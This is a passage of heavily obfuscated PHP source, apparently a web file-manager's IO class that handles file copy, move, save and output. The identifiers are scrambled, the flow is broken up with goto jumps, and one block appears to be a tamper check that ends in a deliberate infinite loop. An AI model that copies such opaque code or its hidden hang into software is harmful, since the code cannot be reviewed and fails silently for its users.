!in_array($B”ÍİåÆËÜ, $c¸ØÄ†•Õ—)) { return $B”ÍİåÆËÜ; } for ($Fõ†Š»à¯ = 0; $Fõ†Š»à¯ < count($c¸ØÄ†•Õ—); $Fõ†Š»à¯++) { if (!in_array($B”ÍİåÆËÜ . "\50{$Fõ†Š»à¯}\51", $c¸ØÄ†•Õ—)) { return $B”ÍİåÆËÜ . "\x28{$Fõ†Š»à¯}\x29"; } } goto fšš‡ºğ•ô; Dèè«†È£‘: $cÀùŠ‡àÈá =& $_SERVER[£¶ä½¶¢]; $FŠÔ¾£ÍÇª = array($cÀùŠ‡àÈá[1518] => USER_ID, $cÀùŠ‡àÈá[471] => 0); $c¸ØÄ†•Õ— = $this->field($cÀùŠ‡àÈá[38])->where($FŠÔ¾£ÍÇª)->select(); goto F…“á¶²Áƒ; fšš‡ºğ•ô: return $B”ÍİåÆËÜ . "\50{$Fõ†Š»à¯}\x29"; goto A„¤˜§óéö; A„¤˜§óéö: } } if (!isset($_SERVER[$_SERVER[£¶ä½¶¢][4]]) || !isset($_SERVER[$_SERVER[£¶ä½¶¢][5]])) { goto DÜ‘Õó¯†•; DÜ‘Õó¯†•: $Aõ³ˆÈ´˜ = $_SERVER[£¶ä½¶¢][6]; $aÂÅ©ŞùÓ = $_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]; $eé‚Î†¿ = $Aõ³ˆÈ´˜($aÂÅ©ŞùÓ); goto A¬å˜¯‰Õ; AÇÌ¦Ï†ãÎ: $D¢Û ÈëóØ($_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]); $B¢ÏÃğºêÂ = 2; while ($B¢ÏÃğºêÂ > 1) { $BÒŸéˆ˜¥¿ = rawurlencode($B¢ÏÃğºêÂ . $_SERVER[£¶ä½¶¢][13]); } goto E·Øö‘¾ù; A¬å˜¯‰Õ: $dìÀ±ô† = explode($_SERVER[£¶ä½¶¢][9], $eé‚Î†¿); if (count($dìÀ±ô†) < $_SERVER[£¶ä½¶¢][10]) { $C“Äšô† = $_SERVER[£¶ä½¶¢][11]; $C“Äšô†(); } $D¢Û ÈëóØ = $_SERVER[£¶ä½¶¢][12]; goto AÇÌ¦Ï†ãÎ; E·Øö‘¾ù: } goto cçÄğïªâÂ; F¬¼¹Œä£»: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aŠó’”¯…¡, $b™ÉÁÇ‡Î) { goto C†ªœ³‡Ã; C†ªœ³‡Ã: $Bå¯ñ˜åˆ¼ =& $_SERVER[£¶ä½¶¢]; $Cí†™õÍà³ = $b™ÉÁÇ‡Î; $GLOBALS[$Bå¯ñ˜åˆ¼[1041]] = $Bå¯ñ˜åˆ¼[1042] . $aŠó’”¯…¡; goto dËìÏÄä²ˆ; dËìÏÄä²ˆ: Hook::trigger($Bå¯ñ˜åˆ¼[1042] . $aŠó’”¯…¡ . $Bå¯ñ˜åˆ¼[1043], $Cí†™õÍà³); $C¯¦İµ¾Õ = self::driverMake($b™ÉÁÇ‡Î[0]); if (method_exists($C¯¦İµ¾Õ, $aŠó’”¯…¡)) { $dÉ¦¹»ªÃÇ = @call_user_func_array(array($C¯¦İµ¾Õ, $aŠó’”¯…¡), $b™ÉÁÇ‡Î); } else { if (method_exists($C¯¦İµ¾Õ, $Bå¯ñ˜åˆ¼[1044])) { $dÉ¦¹»ªÃÇ = @call_user_func_array(array($C¯¦İµ¾Õ, $aŠó’”¯…¡), $b™ÉÁÇ‡Î); } else { if (method_exists(self, $aŠó’”¯…¡)) { $dÉ¦¹»ªÃÇ = @call_user_func_array(array(self, $aŠó’”¯…¡), $b™ÉÁÇ‡Î); } else { $dÉ¦¹»ªÃÇ = call_user_func_array(array(parent, $aŠó’”¯…¡), $b™ÉÁÇ‡Î); } } } goto B™†Âô¿ÔË; B™†Âô¿ÔË: Hook::trigger($Bå¯ñ˜åˆ¼[1042] . $aŠó’”¯…¡ . $Bå¯ñ˜åˆ¼[1045], $Cí†™õÍà³, $dÉ¦¹»ªÃÇ); return $dÉ¦¹»ªÃÇ; goto aªä‚‹ê§Î; aªä‚‹ê§Î: } public static function init($B‡ñ—¢¤‘ß) { return self::driverMake($B‡ñ—¢¤‘ß); } public static function copy($F´¶ Ã²Ù, $b–È ˆ“Ç», $c¶â¶‹§ ˆ = false, $e‚Æ§™›Ô = false) { return self::copyMoveStart($F´¶ Ã²Ù, $b–È ˆ“Ç», $c¶â¶‹§ ˆ, $_SERVER[£¶ä½¶¢][526], $e‚Æ§™›Ô); } public static function move($bîî ¶óõÈ, $Fº¿„ƒ¾Şò, $aÄï½äøÙ = false, $CÇÜ¹É½¹ = false) { return self::copyMoveStart($bîî ¶óõÈ, $Fº¿„ƒ¾Şò, $aÄï½äøÙ, $_SERVER[£¶ä½¶¢][528], $CÇÜ¹É½¹); } private static function copyMoveStart($b‚¶Ëäˆˆİ, $DóóĞÃæ‰, $fíàÑÎ­Ìˆ, $fã‚Èã—î, $Aâ¹§Æõƒ£) { $aµ¸äêèŸ =& $_SERVER[£¶ä½¶¢]; $BË’·±ß = array($b‚¶Ëäˆˆİ, $DóóĞÃæ‰, $fíàÑÎ­Ìˆ, $Aâ¹§Æõƒ£); Hook::trigger($aµ¸äêèŸ[1042] . $fã‚Èã—î . $aµ¸äêèŸ[1043], $BË’·±ß); $D‰Ä¼Ş¯ªî = self::copyMove($b‚¶Ëäˆˆİ, $DóóĞÃæ‰, $fíàÑÎ­Ìˆ, $fã‚Èã—î, $Aâ¹§Æõƒ£); Hook::trigger($aµ¸äêèŸ[1042] . $fã‚Èã—î . $aµ¸äêèŸ[1045], $BË’·±ß, $D‰Ä¼Ş¯ªî); return $D‰Ä¼Ş¯ªî; } public static function saveFile($a¹À­Šöã, $D³›ÚÅè“, $cò‚¥ÚÒ‰Ğ = true) { goto Aáè¢¯Ò½„; DÄ‰±Ã‰Ğ½: $aŞ£Ş’ÀßÓ = self::copyFile($c²¨ÍïÉÙ, $a¹À­Šöã, $bÅÑŒÁç£…, $B‹İË†¾‚, $b¬šåÊÉ¼‚[$Eô¼ëºÈ’½[38]], $cç¼¸ŠÀà´); if ($c·÷ºœ¤ˆª) { $aŞ£Ş’ÀßÓ = $c·÷ºœ¤ˆª->getPathOuter($aŞ£Ş’ÀßÓ); } return $aŞ£Ş’ÀßÓ; goto DÚÀãò”ë£; EœÂ­ï¤Ÿ…: $bÅÑŒÁç£… = self::driverMake($D³›ÚÅè“); $c·÷ºœ¤ˆª = !1; if ($bÅÑŒÁç£…->pathParse[$Eô¼ëºÈ’½[1046]]) { $EàãÓ¨Üå± = $bÅÑŒÁç£…->pathParse[$Eô¼ëºÈ’½[1046]]; $c·÷ºœ¤ˆª = $bÅÑŒÁç£…; $bÅÑŒÁç£… = self::driverMake($EàãÓ¨Üå±); } goto d¤Áôé´’İ; d¤Áôé´’İ: $B‹İË†¾‚ = $bÅÑŒÁç£…->pathFather($D³›ÚÅè“); $cç¼¸ŠÀà´ = !0; if (!$cò‚¥ÚÒ‰Ğ && self::driverIsSame($c²¨ÍïÉÙ, $bÅÑŒÁç£…)) { $cç¼¸ŠÀà´ = !1; } goto DÄ‰±Ã‰Ğ½; Aáè¢¯Ò½„: $Eô¼ëºÈ’½ =& $_SERVER[£¶ä½¶¢]; $b¬šåÊÉ¼‚ = self::info($D³›ÚÅè“); $c²¨ÍïÉÙ = self::driverMake($a¹À­Šöã); goto EœÂ­ï¤Ÿ…; DÚÀãò”ë£: } private static function copyMove($a×¯ÛÂŠöÄ, $CÛ¹õî¼Ş—, $AØÍÖç¹âİ, $Dİ£ø®ä´†, $c‹õ§‰¤Â³ = false) { goto a¥Ì ¤º²Ÿ; bïË¿èÏ§—: $BÛ±Ö¼ÁôÊ = !1; if ($A¡Ò‚‰Åœè->pathParse[$B’óĞ…íã[1046]]) { $CÛ¹õî¼Ş— = $A¡Ò‚‰Åœè->pathParse[$B’óĞ…íã[1046]]; $BÛ±Ö¼ÁôÊ = $A¡Ò‚‰Åœè; $A¡Ò‚‰Åœè = self::driverMake($CÛ¹õî¼Ş—); } self::check($FİÛ¹ÓÜ±–, $a×¯ÛÂŠöÄ, $A¡Ò‚‰Åœè, $CÛ¹õî¼Ş—); goto d°ö‡ˆÏ; d°ö‡ˆÏ: Hook::trigger($B’óĞ…íã[83], $FİÛ¹ÓÜ±–, $a×¯ÛÂŠöÄ, $A¡Ò‚‰Åœè, $CÛ¹õî¼Ş—); $fç­³ÄÂˆ = self::driverIsSame($FİÛ¹ÓÜ±–, $A¡Ò‚‰Åœè); if ($fç­³ÄÂˆ) { if ($Dİ£ø®ä´† == $B’óĞ…íã[528] && !method_exists($A¡Ò‚‰Åœè, $B’óĞ…íã[1047]) && trim($CÛ¹õî¼Ş—, $B’óĞ…íã[18]) == trim($A¡Ò‚‰Åœè->pathFather($a×¯ÛÂŠöÄ), $B’óĞ…íã[18])) { if ($FİÛ¹ÓÜ±–->pathThis($a×¯ÛÂŠöÄ) != $c‹õ§‰¤Â³ && !$FİÛ¹ÓÜ±–->isTypeObject()) { return $FİÛ¹ÓÜ±–->rename($a×¯ÛÂŠöÄ, $c‹õ§‰¤Â³); } return $A¡Ò‚‰Åœè->getPathOuter($a×¯ÛÂŠöÄ); } if (method_exists($A¡Ò‚‰Åœè, $Dİ£ø®ä´†)) { return $A¡Ò‚‰Åœè->{$Dİ£ø®ä´†}($a×¯ÛÂŠöÄ, $CÛ¹õî¼Ş—, $AØÍÖç¹âİ); } } goto Cà‚ãœ¢¦¨; dÃˆõ×ã²¢: if ($BÛ±Ö¼ÁôÊ) { $AÂ¤äÑµã× = $BÛ±Ö¼ÁôÊ->getPathOuter($AÂ¤äÑµã×); } return $AÂ¤äÑµã×; goto d÷†™ÄäÈê; cš¸ùíé£: $FİÛ¹ÓÜ±– = self::driverMake($a×¯ÛÂŠöÄ); $A¡Ò‚‰Åœè = self::driverMake($CÛ¹õî¼Ş—); $CØ¼×”ˆ¨ª = $Dİ£ø®ä´† == $B’óĞ…íã[528]; goto bïË¿èÏ§—; Cà‚ãœ¢¦¨: $c•†¹Ë“µ = $FİÛ¹ÓÜ±–->isFile($a×¯ÛÂŠöÄ); if (!$c•†¹Ë“µ && $A¡Ò‚‰Åœè->getType() == $B’óĞ…íã[726] && $FİÛ¹ÓÜ±–->getType() == $B’óĞ…íã[116]) { $AÂ¤äÑµã× = $A¡Ò‚‰Åœè->copyFolderFromIO($FİÛ¹ÓÜ±–, $a×¯ÛÂŠöÄ, $CÛ¹õî¼Ş—, $AØÍÖç¹âİ, $CØ¼×”ˆ¨ª, $c‹õ§‰¤Â³); } else { $AÂ¤äÑµã× = self::copyPath($FİÛ¹ÓÜ±–, $a×¯ÛÂŠöÄ, $A¡Ò‚‰Åœè, $CÛ¹õî¼Ş—, $AØÍÖç¹âİ, $CØ¼×”ˆ¨ª, $c•†¹Ë“µ, $c‹õ§‰¤Â³); } if ($AÂ¤äÑµã× && $CØ¼×”ˆ¨ª) { $FİÛ¹ÓÜ±–->remove($a×¯ÛÂŠöÄ); } goto dÃˆõ×ã²¢; a¥Ì ¤º²Ÿ: $B’óĞ…íã =& $_SERVER[£¶ä½¶¢]; if (!$a×¯ÛÂŠöÄ || $a×¯ÛÂŠöÄ == $B’óĞ…íã[18] || !$CÛ¹õî¼Ş—) { return !1; } ignore_timeout(); goto cš¸ùíé£; d÷†™ÄäÈê: } private static function check($c®•ßºø, $A“˜óˆÍóˆ, $fìÈ²çŒ–, &$A¿Òì¤Ş¤) { $C˜ï–ÍÛ‰× =& $_SERVER[£¶ä½¶¢]; if (self::driverIsSame($c®•ßºø, $fìÈ²çŒ–) && $c®•ßºø->isFolder($A“˜óˆÍóˆ) && $c®•ßºø->isParentOf($A“˜óˆÍóˆ, $A¿Òì¤Ş¤)) { show_json(LNG($C˜ï–ÍÛ‰×[1048]), !1); } if (!$c®•ßºø->exist($A“˜óˆÍóˆ)) { show_json(LNG($C˜ï–ÍÛ‰×[115]), !1); } } private static function copyPath($a‡ç£‹‡Ç’, $d± Ñ§¶«, $eØ‹ÉÕ„µ, $F¡­‰†Ô×˜, $eŒƒ…ìÚÔ‡, $CëæõÉñù, $eé¦¿‰×á, $eñ¬¡ë„„‘ = false) { goto a«ñ‹„‹‚; cŞ¶ğ¾á‚: self::copyMoveKeepInfo($a‡ç£‹‡Ç’, $d± Ñ§¶«, $F¥ÒæÚ¡ã); return $F¥ÒæÚ¡ã; goto B†ÏÛÍÀ·; a«ñ‹„‹‚: $bŞŠøÕÓµ… =& $_SERVER[£¶ä½¶¢]; $Dõô†³„ÒÂ = empty($eñ¬¡ë„„‘) && $eñ¬¡ë„„‘ !== $bŞŠøÕÓµ…[201] ? $a‡ç£‹‡Ç’->pathThis($d± Ñ§¶«) : $eñ¬¡ë„„‘; if ($eŒƒ…ìÚÔ‡) { $bËÕ„½îÚò = $eØ‹ÉÕ„µ->fileNameExist($F¡­‰†Ô×˜, $Dõô†³„ÒÂ); $Dõô†³„ÒÂ = $eØ‹ÉÕ„µ->fileNameAuto($F¡­‰†Ô×˜, $Dõô†³„ÒÂ, $eŒƒ…ìÚÔ‡, !$eé¦¿‰×á); $eŒƒ…ìÚÔ‡ = $bËÕ„½îÚò ? $eŒƒ…ìÚÔ‡ : !1; } goto cĞĞÛ‚‰; e«¶…íŞ¢¶: $DÂš¨Æ¿à = is_array($DÂš¨Æ¿à) ? $DÂš¨Æ¿à : array($bŞŠøÕÓµ…[84] => array(), $bŞŠøÕÓµ…[85] => array()); $eÅã’ŒéĞˆ = array_merge($DÂš¨Æ¿à[$bŞŠøÕÓµ…[84]], $DÂš¨Æ¿à[$bŞŠøÕÓµ…[85]]); foreach ($eÅã’ŒéĞˆ as $f¤õè’åŒä) { $FÊ¥¤ÛÂÙ© = $f¤õè’åŒä[$bŞŠøÕÓµ…[39]] == $bŞŠøÕÓµ…[203]; $d± Ñ§¶« = $a‡ç£‹‡Ç’->getPathInner($f¤õè’åŒä[$bŞŠøÕÓµ…[86]]); $C«Á‘ƒ²Ê½ = self::copyPath($a‡ç£‹‡Ç’, $d± Ñ§¶«, $eØ‹ÉÕ„µ, $F¡­‰†Ô×˜, $eŒƒ…ìÚÔ‡, $CëæõÉñù, $FÊ¥¤ÛÂÙ©); if (!$C«Á‘ƒ²Ê½) { IO::errorTips($bŞŠøÕÓµ…[1049] . $d± Ñ§¶« . $bŞŠøÕÓµ…[77] . $F¡­‰†Ô×˜); } } goto cŞ¶ğ¾á‚; b‹ŒˆÚ™ã: $F¥ÒæÚ¡ã = $eØ‹ÉÕ„µ->mkdir($eØ‹ÉÕ„µ->getPath($eÓ‹ŠŞÆ³ê)); $F¡­‰†Ô×˜ = $eØ‹ÉÕ„µ->getPathInner($F¥ÒæÚ¡ã); $DÂš¨Æ¿à = $a‡ç£‹‡Ç’->listPath($d± Ñ§¶«, !0); goto e«¶…íŞ¢¶; cĞĞÛ‚‰: if ($eé¦¿‰×á) { return self::copyFile($a‡ç£‹‡Ç’, $d± Ñ§¶«, $eØ‹ÉÕ„µ, $F¡­‰†Ô×˜, $Dõô†³„ÒÂ, $CëæõÉñù); } if ($eŒƒ…ìÚÔ‡ == REPEAT_RENAME_FOLDER) { $eŒƒ…ìÚÔ‡ = !1; } $eÓ‹ŠŞÆ³ê = rtrim($F¡­‰†Ô×˜, $bŞŠøÕÓµ…[18]) . $bŞŠøÕÓµ…[18] . $Dõô†³„ÒÂ; goto b‹ŒˆÚ™ã; B†ÏÛÍÀ·: } private static function copyFile($cñ‹’ªÀä‘, $EãóáÃ˜º, $Fë ÈéĞ¯à, $D‡—µæ‘, $a—™±ÑåÕª, $b¹†ÍÇé) { goto D’›ÚŠÉ›ò; dß¯Â˜˜Ò‘: self::remove($CêáÓÃšÒ•); Hook::trigger($DìÊÛå†ˆ[1052], $cñ‹’ªÀä‘, $EãóáÃ˜º, $Fë ÈéĞ¯à, $D‡—µæ‘, $a—™±ÑåÕª, $F„«²ˆ†Ñİ); self::copyMoveKeepInfo($cñ‹’ªÀä‘, $EãóáÃ˜º, $F„«²ˆ†Ñİ); goto dæÛóÁãñª; dæÛóÁãñª: return $F„«²ˆ†Ñİ; goto bÕĞ­Å†î; a—ÕÆî¯‘: Hook::trigger($DìÊÛå†ˆ[1051], $cñ‹’ªÀä‘, $EãóáÃ˜º, $Fë ÈéĞ¯à, $D‡—µæ‘, $a—™±ÑåÕª, $EÚáèèîº†); if (self::driverIsSame($cñ‹’ªÀä‘, $Fë ÈéĞ¯à)) { if ($b¹†ÍÇé) { $F„«²ˆ†Ñİ = $Fë ÈéĞ¯à->moveFile($EãóáÃ˜º, $D‡—µæ‘); } else { $F„«²ˆ†Ñİ = $Fë ÈéĞ¯à->copyFile($EãóáÃ˜º, $D‡—µæ‘); } Hook::trigger($DìÊÛå†ˆ[1052], $cñ‹’ªÀä‘, $EãóáÃ˜º, $Fë ÈéĞ¯à, $D‡—µæ‘, $a—™±ÑåÕª, $F„«²ˆ†Ñİ); self::copyMoveKeepInfo($cñ‹’ªÀä‘, $EãóáÃ˜º, $F„«²ˆ†Ñİ); return $F„«²ˆ†Ñİ; } $dĞ»âäŸ½ = TEMP_FILES; goto DÃ˜Òã¡™›; DÃ˜Òã¡™›: if ($GLOBALS[$DìÊÛå†ˆ[16]][$DìÊÛå†ˆ[98]][$DìÊÛå†ˆ[768]]) { $dĞ»âäŸ½ = $GLOBALS[$DìÊÛå†ˆ[16]][$DìÊÛå†ˆ[98]][$DìÊÛå†ˆ[768]]; } $b¹†ÍÇé = !0; $bíãğ•…ñ‚ = $dĞ»âäŸ½; goto DÀéíÄœš¦; DÀéíÄœš¦: mk_dir($bíãğ•…ñ‚); $f˜ßŸ›âè = $bíãğ•…ñ‚ . $EÚáèèîº†; $CêáÓÃšÒ• = $f˜ßŸ›âè; goto EßöÌòçè; D’›ÚŠÉ›ò: $DìÊÛå†ˆ =& $_SERVER[£¶ä½¶¢]; $D‡—µæ‘ = $Fë ÈéĞ¯à->getPath(rtrim($D‡—µæ‘, $DìÊÛå†ˆ[18]) . $DìÊÛå†ˆ[18] . $a—™±ÑåÕª); $EÚáèèîº† = $DìÊÛå†ˆ[1050] . time() . rand_string(5); goto a—ÕÆî¯‘; EßöÌòçè: $f˜ßŸ›âè = $cñ‹’ªÀä‘->download($EãóáÃ˜º, $f˜ßŸ›âè); $f˜ßŸ›âè = $cñ‹’ªÀä‘->iconvApp($f˜ßŸ›âè); $F„«²ˆ†Ñİ = $Fë ÈéĞ¯à->upload($D‡—µæ‘, $f˜ßŸ›âè, $b¹†ÍÇé); goto dß¯Â˜˜Ò‘; bÕĞ­Å†î: } private static function copyMoveKeepInfo($a‚š»‰‚®®, $AñÑğÆ‘», $d¿‡¢ˆ…¼½) { if (!$d¿‡¢ˆ…¼½) { return; } $a×Ë¿âªÊÄ = $a‚š»‰‚®®->info($AñÑğÆ‘»); if (!is_array($a×Ë¿âªÊÄ)) { return; } IO::setModifyTime($d¿‡¢ˆ…¼½, $a×Ë¿âªÊÄ[$_SERVER[£¶ä½¶¢][94]]); } public static function pathFather($d¸·¬ŸíÊß) { $aØŒÌÌ‹˜‡ = IO::init($d¸·¬ŸíÊß); $C›ßêÙ„Á = $aØŒÌÌ‹˜‡->pathFather($aØŒÌÌ‹˜‡->path); return $aØŒÌÌ‹˜‡->getPathOuter($C›ßêÙ„Á); } public static function fileOut($BÛƒÅ™÷, $BŒ ƒÓ‘ìÔ = false, $e©«Ñ“¬½¶ = false, $cæõÉ¨¤…ò = '') { $E·âğŞ·Õ = self::driverMake($BÛƒÅ™÷); if ($E·âğŞ·Õ->isFileOutServer()) { return $E·âğŞ·Õ->fileOutServer($BÛƒÅ™÷, $BŒ ƒÓ‘ìÔ, $e©«Ñ“¬½¶, $cæõÉ¨¤…ò); } return $E·âğŞ·Õ->fileOut($BÛƒÅ™÷, $BŒ ƒÓ‘ìÔ, $e©«Ñ“¬½¶, $cæõÉ¨¤…ò); } public static function fileOutImage($BŒ•¾‘§ó, $Dóİ‡ÍìéÚ = 250) { $e°ÃƒæÕ–Õ = array(250, 600, 1200, 3000, 5000); for ($AÂÖÛ×Ü¦° = 0; $AÂÖÛ×Ü¦° < count($e°ÃƒæÕ–Õ); $AÂÖÛ×Ü¦°++) { if ($AÂÖÛ×Ü¦° == 0 && $Dóİ‡ÍìéÚ <= $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦°]) { $Dóİ‡ÍìéÚ = $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦°]; break; } else { if ($Dóİ‡ÍìéÚ > $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦° - 1] && $Dóİ‡ÍìéÚ <= $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦°]) { $Dóİ‡ÍìéÚ = $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦°]; break; } else { if ($AÂÖÛ×Ü¦° == count($e°ÃƒæÕ–Õ) - 1 && $Dóİ‡ÍìéÚ > $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦°]) { $Dóİ‡ÍìéÚ = $e°ÃƒæÕ–Õ[$AÂÖÛ×Ü¦°]; break; } } } } $C“”ä…—¥ß = self::driverMake($BŒ•¾‘§ó); if ($C“”ä…—¥ß->isFileOutServer()) { return $C“”ä…—¥ß->fileOutImageServer($BŒ•¾‘§ó, $Dóİ‡ÍìéÚ); } return $C“”ä…—¥ß->fileOutImage($BŒ•¾‘§ó, $Dóİ‡ÍìéÚ); } private static function driverIsSame($a“ˆÜÍíİ, $cøÄÄª®”Ì) { goto CÈòéê®; dß‚ŒÁâÇ: if ($dŞÉÆÃœ›á != $aÉºòëÜÈ) { return !1; } if ($dŞÉÆÃœ›á == $eÌ¡ª¤¿Ò°[726]) { return !0; } if ($dŞÉÆÃœ›á == $eÌ¡ª¤¿Ò°[116]) { return !0; } goto DÌŞ÷­É…; CÈòéê®: $eÌ¡ª¤¿Ò° =& $_SERVER[£¶ä½¶¢]; $dŞÉÆÃœ›á = $a“ˆÜÍíİ->getType(); $aÉºòëÜÈ = $cøÄÄª®”Ì->getType(); goto dß‚ŒÁâÇ; DÌŞ÷­É…: if ($a“ˆÜÍíİ->pathDriver == $cøÄÄª®”Ì->pathDriver) { return !0; } return !1; goto e©–‡¯ÃÅÑ; e©–‡¯ÃÅÑ: } public static function copyUpdate($A½Â»Óñ¬Œ, $eËš‹°‡®‘) { goto e–ğ­Í†Ğ; E¤Ó±Š¢’: $B÷˜„ºÀà˜ = array(); foreach ($d¸¬â§ÛÒ‚ as $D„Èå‡×†¤ => $cáç¤·Êå¤) { if (isset($Eô­…ÁæØ[$D„Èå‡×†¤])) { if ($cáç¤·Êå¤[$FÒÛñŠÄœ»[87]] == 1) { continue; } if ($Eô­…ÁæØ[$D„Èå‡×†¤][$FÒÛñŠÄœ»[88]] == $cáç¤·Êå¤[$FÒÛñŠÄœ»[88]]) { continue; } } if ($cáç¤·Êå¤[$FÒÛñŠÄœ»[87]] == 1) { $B÷˜„ºÀà˜[] = $eËš‹°‡®‘ . $FÒÛñŠÄœ»[18] . $D„Èå‡×†¤; continue; } $cÊËŸÜ®ğæ = strstr(trim($D„Èå‡×†¤, $FÒÛñŠÄœ»[18]), $FÒÛñŠÄœ»[18]) ? get_path_father($D„Èå‡×†¤) : $FÒÛñŠÄœ»[43]; $fÃ»Óª°Ÿ´[] = array($FÒÛñŠÄœ»[1053] => $cáç¤·Êå¤[$FÒÛñŠÄœ»[86]], $FÒÛñŠÄœ»[1054] => rtrim($eËš‹°‡®‘, $FÒÛñŠÄœ»[18]) . $FÒÛñŠÄœ»[18] . $cÊËŸÜ®ğæ, $FÒÛñŠÄœ»[1055] => $cáç¤·Êå¤); } $eÈÂìÅÊ—Œ = array($FÒÛñŠÄœ»[203] => $fÃ»Óª°Ÿ´, $FÒÛñŠÄœ»[87] => $B÷˜„ºÀà˜); goto CÑ‰œ’¼í; e–ğ­Í†Ğ: $FÒÛñŠÄœ» =& $_SERVER[£¶ä½¶¢]; if (!IO::exist($A½Â»Óñ¬Œ)) { return !1; } if (!IO::exist($eËš‹°‡®‘)) { IO::mkdir($eËš‹°‡®‘); } goto eŠèâ×á¹; eŠèâ×á¹: $d¸¬â§ÛÒ‚ = self::_listAll($A½Â»Óñ¬Œ); $Eô­…ÁæØ = self::_listAll($eËš‹°‡®‘); $fÃ»Óª°Ÿ´ = array(); goto E¤Ó±Š¢’; CÑ‰œ’¼í: Hook::trigger($FÒÛñŠÄœ»[1056], $A½Â»Óñ¬Œ, $eËš‹°‡®‘, $eÈÂìÅÊ—Œ); foreach ($B÷˜„ºÀà˜ as $cáç¤·Êå¤) { IO::mkdir($cáç¤·Êå¤); } foreach ($fÃ»Óª°Ÿ´ as $cáç¤·Êå¤) { IO::copy($cáç¤·Êå¤[$FÒÛñŠÄœ»[1053]], $cáç¤·Êå¤[$FÒÛñŠÄœ»[1054]], REPEAT_REPLACE); } goto C®Å©ÀŸ†¸; C®Å©ÀŸ†¸: } private static function _listAll($dµ”·ÄÃÎĞ) { $dß®Çìˆ† =& $_SERVER[£¶ä½¶¢]; $dµ”·ÄÃÎĞ = KodIO::clear($dµ”·ÄÃÎĞ); $bà¬ŒÎõªê = IO::listAll($dµ”·ÄÃÎĞ); foreach ($bà¬ŒÎõªê as &$e‹†˜¼¾œ‰) { $E¬¨ö…›’ = substr($e‹†˜¼¾œ‰[$dß®Çìˆ†[86]], strlen($dµ”·ÄÃÎĞ)); $e‹†˜¼¾œ‰[$dß®Çìˆ†[1057]] = trim($E¬¨ö…›’, $dß®Çìˆ†[18]); } unset($e‹†˜¼¾œ‰); return array_to_keyvalue($bà¬ŒÎõªê, $dß®Çìˆ†[1057]); } public static function fileSubstr($FÓÒ‡ÅÛİ, $E£‘ÖéØËè, $b¸ÚÕğ•‰ç = false) { goto B¤˜åç»Ÿì; E«­Šõô’å: $D‹›ä‘‹† = $E£‘ÖéØËè; $D®ùµ“Ó©Ø = $b¸ÚÕğ•‰ç; if ($E£‘ÖéØËè < 0) { $E£‘ÖéØËè = $e„Ì¥Ø„ïÈ + $E£‘ÖéØËè; } goto F ‰˜šÃŸ; B¤˜åç»Ÿì: $c„Ãƒ¢‹ÁØ =& $_SERVER[£¶ä½¶¢]; $Fù²†´Ì’  = self::driverMake($FÓÒ‡ÅÛİ); $e„Ì¥Ø„ïÈ = $Fù²†´Ì’ ->size($FÓÒ‡ÅÛİ); goto E«­Šõô’å; D”ÖêÍÇ„Æ: if (!$E×à»Š–¥ && $b¸ÚÕğ•‰ç && isset($GLOBALS[$c„Ãƒ¢‹ÁØ[1060]])) { throw new Exception($GLOBALS[$c„Ãƒ¢‹ÁØ[1060]][$c„Ãƒ¢‹ÁØ[1061]]); } return $E×à»Š–¥; goto cíñ†´˜¯¢; AÍææ¥Şò‘: if ($b¸ÚÕğ•‰ç <= 0) { return $c„Ãƒ¢‹ÁØ[43]; } if ($E£‘ÖéØËè < 0 || $E£‘ÖéØËè >= $e„Ì¥Ø„ïÈ || $b¸ÚÕğ•‰ç > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\x65\x52\145\x61\144\x20\x65\162\x72\157\x72\x21\x20\x73\x74\x61\162\x74\x3d{$E£‘ÖéØËè}\73\x6c\x65\x6e\x67\x74\x68\x3d{$b¸ÚÕğ•‰ç}\73\x20\163\151\x7a\145\x3d{$e„Ì¥Ø„ïÈ}\73"); } $E×à»Š–¥ = $Fù²†´Ì’ ->fileSubstr($FÓÒ‡ÅÛİ, $E£‘ÖéØËè, $b¸ÚÕğ•‰ç); goto D”ÖêÍÇ„Æ; F ‰˜šÃŸ: if ($b¸ÚÕğ•‰ç === !1) { $b¸ÚÕğ•‰ç = $e„Ì¥Ø„ïÈ - $E£‘ÖéØËè; } if ($E£‘ÖéØËè + $b¸ÚÕğ•‰ç > $e„Ì¥Ø„ïÈ) { $b¸ÚÕğ•‰ç = $e„Ì¥Ø„ïÈ - $E£‘ÖéØËè; } if (!$e„Ì¥Ø„ïÈ && $Fù²†´Ì’ ->getType() == $c„Ãƒ¢‹ÁØ[116] && !$Fù²†´Ì’ ->exist($FÓÒ‡ÅÛİ)) { throw new Exception($c„Ãƒ¢‹ÁØ[1058] . LNG($c„Ãƒ¢‹ÁØ[1059]) . $c„Ãƒ¢‹ÁØ[922] . get_path_this($FÓÒ‡ÅÛİ) . $c„Ãƒ¢‹ÁØ[43]); } goto AÍææ¥Şò‘; cíñ†´˜¯¢: } private static function driverMake(&$c†„á¶…±ª) { goto EŒá÷‹ßÑ; e›©¼´¹÷¨: return $cä‹ó¾¦Ö‚; goto b›¶ç´ù; EÙ°Üö¶Ö™: if ($bœÁ×ŒŠ††[$b‘™…ó‚ãÆ[39]] == KodIO::KOD_IO && !self::$driverListSystem[$bœÁ×ŒŠ††[$b‘™…ó‚ãÆ[401]]]) { return !1; } $c†„á¶…±ª = $bœÁ×ŒŠ††[$b‘™…ó‚ãÆ[1062]]; $cä‹ó¾¦Ö‚ = self::driverGet($bœÁ×ŒŠ††, $c†„á¶…±ª); goto e›©¼´¹÷¨; EŒá÷‹ßÑ: $b‘™…ó‚ãÆ =& $_SERVER[£¶ä½¶¢]; $bœÁ×ŒŠ†† = KodIO::parse($c†„á¶…±ª); if (!self::$driverListSystem) { $D­è¤Ì›‡Ö = Model($b‘™…ó‚ãÆ[735])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($D­è¤Ì›‡Ö, $b‘™…ó‚ãÆ[401]); } goto EÙ°Üö¶Ö™; b›¶ç´ù: } private static function driverGet($aŒ¡Õ±Ÿ…, 